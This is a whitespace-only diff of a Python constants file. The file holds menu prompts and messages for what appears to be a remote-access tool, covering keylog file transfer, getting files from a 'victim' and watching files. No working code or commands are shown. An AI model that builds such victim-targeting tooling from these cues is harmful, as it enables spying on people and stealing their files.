@@ -166,6 +166,7 @@ FILE_TRANSFER_KEYLOG_ERROR = ("[+] FILE TRANSFER ERROR: Cannot transfer file to 
 TRANSFER_FILE_ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer file to: "
 TRANSFER_FILE_ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
 
+
 # MENU ITEM 7 - Get File from Victim
 GET_FILE_SIGNAL = "GET FILE"
 GET_FILE_SIGNAL_MSG = ("[+] GET FILE: Sending signal to client/victim to "
@@ -201,7 +202,6 @@ FIELD_SELECTED_MSG = "[+] FIELD SELECTED: {}"
 CHOICES_NOT_FOUND_IN_MAP_ERROR = ("[+] TRANSFER FILE ERROR: The choices chosen are not defined and not present in "
                                   "function mapping!")
 CALL_MAP_FUNCTION_ERROR = "[+] TRANSFER FILE ERROR: Invalid operation while calling mapped function!"
-
 
 
 # MENU ITEM 9 - Watch File
